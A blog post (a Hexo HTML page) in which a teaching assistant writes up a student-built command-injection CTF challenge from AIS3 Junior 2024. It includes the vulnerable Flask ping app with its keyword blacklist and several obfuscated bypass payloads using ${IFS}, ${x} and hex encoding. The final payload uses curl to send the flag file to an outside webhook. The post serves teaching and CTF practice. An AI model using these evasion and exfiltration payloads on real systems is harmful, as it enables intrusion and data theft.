@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="AIS3 Junior 2024-command injection bypass master
+Author: 堇姬Naup
+
+前言這次去AIS3 junior當了助教，也是我第一次當助教，這次跟vincent一起擔任A組的助教，本篇記錄了一些我們學員專題題目，我的解題及vincent的解題方法
+"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="AIS3 Junior 2024-command injection bypass master"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="AIS3 Junior 2024-command injection bypass master
+Author: 堇姬Naup
+
+前言這次去AIS3 junior當了助教，也是我第一次當助教，這次跟vincent一起擔任A組的助教，本篇記錄了一些我們學員專題題目，我的解題及vincent的解題方法
+"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<!-- Title -->
+
+<title>AIS3 Junior 2024-command injection bypass master | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg2.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>AIS3 Junior 2024-command injection bypass master</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-08-19
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="AIS3-Junior-2024-command-injection-bypass-master"><a href="#AIS3-Junior-2024-command-injection-bypass-master" class="headerlink" title="AIS3 Junior 2024-command injection bypass master"></a>AIS3 Junior 2024-command injection bypass master</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>這次去AIS3 junior當了助教，也是我第一次當助教，這次跟vincent一起擔任A組的助教，本篇記錄了一些我們學員專題題目，我的解題及vincent的解題方法</p>
+<h2 id="學員的專題"><a href="#學員的專題" class="headerlink" title="學員的專題"></a>學員的專題</h2><p>這次A組的學員挑的專題是針對command injection加入了更多黑名單bypass的方法，他們出完很開心的拿來給我跟vincent玩，結果我們問他們有沒有官解他們說沒有www，不過這題是真的出的很好</p>
+<p>先看source code吧</p>
+<p>main</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">oprBlackList = [<span class="string">&quot; &quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;||&quot;</span>, <span class="string">&quot;&amp;&amp;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>]</span><br><span class="line">cmdBlackList = [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot;awk&quot;</span>, <span class="string">&quot;curl&quot;</span>,<span class="string">&quot;A&quot;</span>,<span class="string">&quot;a&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, inlinePage=render_template(<span class="string">&quot;card.html&quot;</span>, message=render_template(<span class="string">&quot;post.html&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_command</span>():</span><br><span class="line">    ip = request.form.get(<span class="string">&quot;ip&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">any</span>(opr <span class="keyword">in</span> ip <span class="keyword">for</span> opr <span class="keyword">in</span> oprBlackList) <span class="keyword">or</span> <span class="built_in">any</span>(cmd <span class="keyword">in</span> ip <span class="keyword">for</span> cmd <span class="keyword">in</span> cmdBlackList)):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, inlinePage=render_template(<span class="string">&quot;card.html&quot;</span>, message=render_template(<span class="string">&quot;post.html&quot;</span>), result=<span class="string">&quot;DANGER : \nDetected that the command line contains blacklist elements&quot;</span>))</span><br><span class="line"></span><br><span class="line">    command = <span class="string">f&quot;ping -c 1 <span class="subst">&#123;ip&#125;</span> 2&gt;&amp;1&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(command)</span><br><span class="line">    result = os.popen(command).read()</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Name or service not known&quot;</span> <span class="keyword">in</span> result : <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, inlinePage=render_template(<span class="string">&quot;card.html&quot;</span>, message=render_template(<span class="string">&quot;post.html&quot;</span>), result=<span class="string">&quot;ERROR : \n&quot;</span> + result))</span><br><span class="line">    <span class="keyword">else</span> : <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, inlinePage=render_template(<span class="string">&quot;card.html&quot;</span>, message=render_template(<span class="string">&quot;post.html&quot;</span>), result=<span class="string">&quot;EVERY THING IS GOOD&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8012</span>, debug=<span class="literal">False</span>)</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>他ban掉了一些字元，但可以bypass</p>
+<p>首先是cat ls cd whoami這些字元其實都是可以透過在中間加入一個${x}來bypass的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c$&#123;x&#125;at</span><br></pre></td></tr></table></figure>
+
+<p>再來我覺得比較麻煩的ban掉了A跟a，會影響到cat、base64甚至是後續利用網址有a的問題</p>
+<p>另外像是?跟&#x2F;這兩個字被ban，也影響到後續我使用curl手法來收flag(因為網址有&#x2F;，GET request有?)</p>
+<p>而我這邊挑選bypass的方法是xxd，也就是將輸出的字在ASCII跟hex間做轉換</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxd -r -p //hex to ASCII</span><br><span class="line">xxd -p // ASCII to hex</span><br></pre></td></tr></table></figure>
+
+<p>再來是因為xxd轉hex有時候會產生’\n’，所以我透過tr -d來刪除換行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr -d &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>
+<p>再來空格就老方法${IFS}</p>
+<p>我們來嘗試開串吧</p>
+<p>首先我們最需要考慮的是，怎麼讀檔案，因為a被禁用，所以不能用echo來讀，那我們可以去這個網站逛逛</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p>這個網站上有很多command read file一些trick<br>最後我突然想到可以用strings來印出檔案裡面的東西，所以先串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings$&#123;IFS&#125;FLAG</span><br></pre></td></tr></table></figure>
+<p>然後就會發現FLAG的A被blacklist掉，所以採用hex的方案來解決，把FLAG轉hex，再用xxd轉回ASCII造出FLAG</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$&#123;IFS&#125;&#x27;464c4147&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p)</span><br></pre></td></tr></table></figure>
+<p>再來丟到strings讀<br>變成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(strings$&#123;IFS&#125;$(echo$&#123;IFS&#125;&#x27;464c4147&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p))</span><br></pre></td></tr></table></figure>
+<p>這樣就可以讀FLAG，但是會發現一件很尷尬的事，因為FLAG這份檔案用了摩斯密碼進行加密，內容的<code>-.</code>被當成參數，導致ping直接噴錯，所以我嘗試印出FLAG後再進行一次hex</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(echo$&#123;IFS&#125;$(strings$&#123;IFS&#125;$(echo$&#123;IFS&#125;&#x27;464c4147&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p))|$&#123;IFS&#125;xxd$&#123;IFS&#125;-p|tr$&#123;IFS&#125;-d$&#123;IFS&#125;&#x27;\n&#x27;)</span><br></pre></td></tr></table></figure>
+<p>然後就解…了嗎?<br><div class="img-item" data-src="https://hackmd.io/_uploads/Sk0cfOyjC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Sk0cfOyjC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>居然被當正常的輸入ping成功了，沒有噴錯<br>所以並沒有進到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;Name or service not known&quot;</span> <span class="keyword">in</span> result : <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, inlinePage=render_template(<span class="string">&quot;card.html&quot;</span>, message=render_template(<span class="string">&quot;post.html&quot;</span>), result=<span class="string">&quot;ERROR : \n&quot;</span> + result))</span><br></pre></td></tr></table></figure>
+
+<p>來把我們想要的結果印出來<br>我嘗試try了許多方法，像是塞入空格或是特殊字元，讓ping噴出<code>Name or service not known</code>，但都失敗了</p>
+<p>最後我採用了curl的方式將我們的FLAG送出來<br>同樣的觀察webhook網址使用了<code>/</code>，但我發現一樣可以使用hex來解決，所以這邊先把webhook網址hex</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68747470733A2F2F776562686F6F6B2E736974652F63363266373331632D333264312D346563392D383033652D393237323839393462306139</span><br></pre></td></tr></table></figure>
+<p>but，<code>:</code>這個hex結果是<code>3A</code>，又有A，所以一樣有問題，想了一下發現，hex一次不行，那我就double hex就好了，所以最後產生出webhook網址的方式是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(echo$&#123;IFS&#125;&#x27;3638373437343730373333613266326637373635363236383666366636623265373336393734363532663633333633323636333733333331363332643333333236343331326433343635363333393264333833303333363532643339333233373332333833393339333436323330363133393061&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p)</span><br></pre></td></tr></table></figure>
+<p>最後用curl直接送出FLAG內容就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(cu$&#123;x&#125;rl$&#123;IFS&#125;$(echo$&#123;IFS&#125;&#x27;3638373437343730373333613266326637373635363236383666366636623265373336393734363532663633333633323636333733333331363332643333333236343331326433343635363333393264333833303333363532643339333233373332333833393339333436323330363133393061&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p)$&#123;IFS&#125;-X$&#123;IFS&#125;POST$&#123;IFS&#125;-d$&#123;IFS&#125;$(echo$&#123;IFS&#125;$(strings$&#123;IFS&#125;$(echo$&#123;IFS&#125;&#x27;464c4147&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p))|$&#123;IFS&#125;xxd$&#123;IFS&#125;-p|tr$&#123;IFS&#125;-d$&#123;IFS&#125;&#x27;\n&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>收到FLAG的內容</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1vrbBeo0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1vrbBeo0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>這樣就成功了…嗎?<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJ4zZHejC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJ4zZHejC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>我們嘗試解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.. .----. -- / .- / -... .- -.. / .... .- -.-. -.- . .-. --..-- / .--. .-.. . .- ... . / ... . . / .-..-. .-.-.- ..-. .-.. .- --. .-..-.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I&#x27;M A BAD HACKER, PLEASE SEE &quot;.FLAG&quot;</span><br></pre></td></tr></table></figure>
+
+<p>這裡的巧思很好，由於ban掉了a，導致ls不會印出<code>.FLAG</code>這個檔案，下意識就會去印FLAG，而摩斯密碼在印出的時候會遇到許多問題，總之就把上述payload的FLAG改成.FLAG就可以解了</p>
+<h3 id="Final-payload"><a href="#Final-payload" class="headerlink" title="Final payload"></a>Final payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(cu$&#123;x&#125;rl$&#123;IFS&#125;$(echo$&#123;IFS&#125;&#x27;3638373437343730373333613266326637373635363236383666366636623265373336393734363532663633333633323636333733333331363332643333333236343331326433343635363333393264333833303333363532643339333233373332333833393339333436323330363133393061&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p)$&#123;IFS&#125;-X$&#123;IFS&#125;POST$&#123;IFS&#125;-d$&#123;IFS&#125;$(strings$&#123;IFS&#125;$(echo$&#123;IFS&#125;&#x27;2e464c4147&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p)))</span><br></pre></td></tr></table></figure>
+<h2 id="vincent的payload"><a href="#vincent的payload" class="headerlink" title="vincent的payload"></a>vincent的payload</h2><p>vincent作法是，因為ping沒有輸出<code>Name or service not known</code>，所以我們就echo自己印，一樣用hex再用xxd轉回來輸出，來成功輸出FLAG</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;$(echo$&#123;IFS&#125;&#x27;4e616d65206f722073657276696365206e6f74206b6e6f776e&#x27;|xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p)$(strings$&#123;IFS&#125;`echo$&#123;IFS&#125;&#x27;2e464c4147&#x27;|xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p`|xxd$&#123;IFS&#125;-p)&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="壓payload"><a href="#壓payload" class="headerlink" title="壓payload"></a>壓payload</h2><p>那時候跟vincent討論是不是可以把payload壓短，然後上長度限制，最後把長度壓到了132</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;$(&#123;echo,&#x27;4e616d65206f722073657276696365206e6f74206b6e6f776e&#x27;&#125;|&#123;xxd,-r,-p&#125;)$(strings$IFS`&#123;echo,&#x27;2e464c4147&#x27;&#125;|&#123;xxd,-r,-p&#125;`|&#123;xxd,-p&#125;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>使用大括號可以省掉很多${IFS}</p>
+<p>最後總結我們的bypass技巧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -&gt; 在ping之前就curl出去</span><br><span class="line">$() -&gt; 用來執行</span><br><span class="line">$&#123;x&#125; -&gt; 繞 curl 等blacklist bypass</span><br><span class="line">$&#123;IFS&#125; -&gt; 空格bypass</span><br><span class="line">xxd -&gt; ASCII跟十六進制間轉換</span><br><span class="line">strings -&gt; the 讀 FLAG</span><br><span class="line">tr -d ‘\n’ -&gt; 把換行拔掉</span><br><span class="line">直接echoh錯誤訊息</span><br><span class="line">&#123;&#125; -&gt; 包住指令節省空白符</span><br></pre></td></tr></table></figure>
+
+<h2 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h2><p>最後放張圖，當助教好好玩ww(熊熊是vincent的)<br><div class="img-item" data-src="https://hackmd.io/_uploads/HyGt4rgi0.jpg" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyGt4rgi0.jpg" alt="IMG20240818154603"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">IMG20240818154603</span></div></div></p>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/08/12/Pwn-SROP/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
